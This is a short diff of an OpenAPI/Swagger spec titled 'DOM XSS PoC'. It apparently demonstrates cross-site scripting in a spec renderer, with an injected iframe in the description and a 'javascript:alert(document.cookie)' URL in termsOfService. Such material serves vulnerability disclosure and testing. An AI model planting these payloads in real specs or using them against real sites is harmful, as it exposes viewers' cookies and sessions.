@@ -6,7 +6,7 @@ securityDefinitions:
 info:
   version: "0.0.1"
   title: DOM XSS PoC
-  description: <h1>XSS</h1><iframe src="https://id.atlassian.com" allow="camera:*;" >
+  description: <h1>blrrr</h1><iframe src="https://id.atlassian.com" allow="camera:*;" ></iframe>
   termsOfService: "javascript:alert(document.cookie)"
 paths:
   /:
